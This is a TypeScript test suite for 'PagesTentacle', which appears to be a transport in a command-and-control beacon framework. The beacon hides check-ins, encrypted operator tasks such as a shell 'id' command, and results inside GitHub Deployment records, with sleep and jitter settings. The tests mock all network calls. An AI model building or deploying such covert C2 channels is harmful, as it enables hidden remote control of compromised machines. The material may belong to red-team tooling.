import { describe, it, expect, mock, beforeEach } from "bun:test";

// Mock must be declared before the module is imported
const mockRepos = {
  listDeployments:      mock(async () => ({ data: [] as any[] })),
  createDeployment:     mock(async () => ({ data: { id: 42 } })),
  createDeploymentStatus: mock(async () => ({})),
};
const mockActions = {
  getRepoVariable: mock(async () => ({ data: { value: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" } })),
};
const mockReposBase = { get: mock(async () => ({})) };

mock.module("@octokit/rest", () => ({
  Octokit: class {
    hook = { wrap: (_name: string, _fn: Function) => {} };
    rest = {
      repos: { ...mockRepos, get: mockReposBase.get },
      actions: mockActions,
    };
  },
}));

import { PagesTentacle } from "../tentacles/PagesTentacle.ts";
import { generateKeyPair, bytesToBase64, encryptBox } from "../crypto/sodium.ts";
import type { BeaconConfig } from "../types.ts";

async function makeConfig(): Promise<BeaconConfig> {
  const kp = await generateKeyPair();
  return {
    id: "abcd1234-5678-90ab-cdef-1234567890ab",
    repo: { owner: "testowner", name: "testrepo" },
    token: "ghp_test",
    tentaclePriority: ["pages"],
    sleepSeconds: 60,
    jitter: 0.3,
    operatorPublicKey: new Uint8Array(32),
    beaconKeyPair: kp,
  };
}

const PAYLOAD = {
  beaconId: "abcd1234-5678-90ab-cdef-1234567890ab",
  publicKey: "",
  hostname: "host", username: "user", os: "linux", arch: "x64",
  pid: 1234, checkinAt: new Date().toISOString(),
};

describe("PagesTentacle", () => {
  beforeEach(() => {
    mockRepos.listDeployments.mockClear();
    mockRepos.createDeployment.mockClear();
    mockRepos.createDeploymentStatus.mockClear();
    mockActions.getRepoVariable.mockClear();
    mockReposBase.get.mockClear();
  });

  it("isAvailable returns true when listDeployments succeeds", async () => {
    const t = new PagesTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(true);
    expect(mockRepos.listDeployments).toHaveBeenCalledTimes(1);
  });

  it("isAvailable returns false when listDeployments throws", async () => {
    mockRepos.listDeployments.mockImplementationOnce(async () => {
      throw Object.assign(new Error("403 Forbidden"), { status: 403 });
    });
    const t = new PagesTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(false);
  });

  it("checkin sends ACK deployment on first call", async () => {
    // listDeployments returns empty (no task deployment)
    mockRepos.listDeployments.mockResolvedValueOnce({ data: [] });

    const t = new PagesTentacle(await makeConfig());
    const tasks = await t.checkin(PAYLOAD);
    expect(tasks).toEqual([]);

    // ACK deployment should have been created
    expect(mockRepos.createDeployment).toHaveBeenCalledTimes(1);
    const createCall = (mockRepos.createDeployment.mock.calls[0] as any)[0] as any;
    expect(createCall.environment).toMatch(/^ci-abcd1234$/);
    const desc = JSON.parse(createCall.description);
    expect(desc.beaconId).toBe("abcd1234-5678-90ab-cdef-1234567890ab");
    expect(desc.hostname).toBe("host");
  });

  it("checkin returns [] when no task deployment found", async () => {
    mockRepos.listDeployments.mockResolvedValueOnce({ data: [] });

    const t = new PagesTentacle(await makeConfig());
    const tasks = await t.checkin(PAYLOAD);
    expect(tasks).toEqual([]);
  });

  it("checkin returns [] when task deployment id is unchanged (already seen)", async () => {
    const cfg = await makeConfig();
    const id8 = cfg.id.slice(0, 8);

    const taskDeploy = {
      id: 99,
      environment: `ci-t-${id8}`,
      payload: JSON.stringify({ nonce: "bad", ciphertext: "bad" }),
    };

    // First checkin: gets task deployment (decrypt fails → []), records id
    mockRepos.listDeployments.mockResolvedValueOnce({ data: [taskDeploy] });

    const t = new PagesTentacle(cfg);
    const first = await t.checkin(PAYLOAD);
    expect(first).toEqual([]);  // decrypt fails gracefully

    mockRepos.listDeployments.mockResolvedValueOnce({ data: [taskDeploy] });
    mockRepos.createDeployment.mockClear();

    // Second checkin — same deployment id, should bail early
    const second = await t.checkin({ ...PAYLOAD });
    expect(second).toEqual([]);
    // createDeployment should NOT be called for task (no new deployment)
    // Only the ACK is from the first call; second call has ackSent=true
    expect(mockRepos.createDeployment).not.toHaveBeenCalled();
  });

  it("checkin decrypts tasks from task deployment payload (full crypto round-trip)", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig();
    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });

    const id8 = cfg.id.slice(0, 8);

    const taskList = [{ taskId: "t1", kind: "shell" as const, args: { cmd: "id" }, ref: "r1" }];
    const encrypted = await encryptBox(
      JSON.stringify(taskList),
      cfg.beaconKeyPair.publicKey,
      operatorKp.secretKey,
    );

    const taskDeploy = {
      id: 77,
      environment: `ci-t-${id8}`,
      payload: JSON.stringify(encrypted),
    };

    // First checkin sees the task deployment
    mockRepos.listDeployments.mockResolvedValueOnce({ data: [taskDeploy] });

    const t = new PagesTentacle(cfg);
    const tasks = await t.checkin({ ...PAYLOAD, beaconId: cfg.id });

    expect(tasks).toHaveLength(1);
    expect(tasks[0]!.taskId).toBe("t1");
    // createDeploymentStatus called to mark task deployment inactive
    expect(mockRepos.createDeploymentStatus).toHaveBeenCalledTimes(1);
    const statusCall = (mockRepos.createDeploymentStatus.mock.calls[0] as any)[0] as any;
    expect(statusCall.deployment_id).toBe(77);
    expect(statusCall.state).toBe("inactive");
  });

  it("submitResult creates a result deployment", async () => {
    const t = new PagesTentacle(await makeConfig());
    await t.submitResult({
      taskId: "t1", beaconId: "abcd1234-5678-90ab-cdef-1234567890ab",
      success: true, output: "hello", completedAt: new Date().toISOString(),
    });
    expect(mockRepos.createDeployment).toHaveBeenCalledTimes(1);
    const createCall = (mockRepos.createDeployment.mock.calls[0] as any)[0] as any;
    expect(createCall.environment).toMatch(/^ci-r-abcd1234$/);
    expect(createCall.description).toBe("result");
  });

  it("teardown marks ack deployment inactive", async () => {
    mockRepos.listDeployments.mockResolvedValueOnce({ data: [] });

    const t = new PagesTentacle(await makeConfig());
    // First checkin to set ackDeploymentId (mocked createDeployment returns id: 42)
    await t.checkin(PAYLOAD);
    mockRepos.createDeploymentStatus.mockClear();

    await t.teardown();
    expect(mockRepos.createDeploymentStatus).toHaveBeenCalledTimes(1);
    const statusCall = (mockRepos.createDeploymentStatus.mock.calls[0] as any)[0] as any;
    expect(statusCall.deployment_id).toBe(42);
    expect(statusCall.state).toBe("inactive");
  });

  it("teardown does nothing when no ACK deployment was created", async () => {
    const t = new PagesTentacle(await makeConfig());
    // Never called checkin — ackDeploymentId is null
    await expect(t.teardown()).resolves.toBeUndefined();
    expect(mockRepos.createDeploymentStatus).not.toHaveBeenCalled();
  });
});
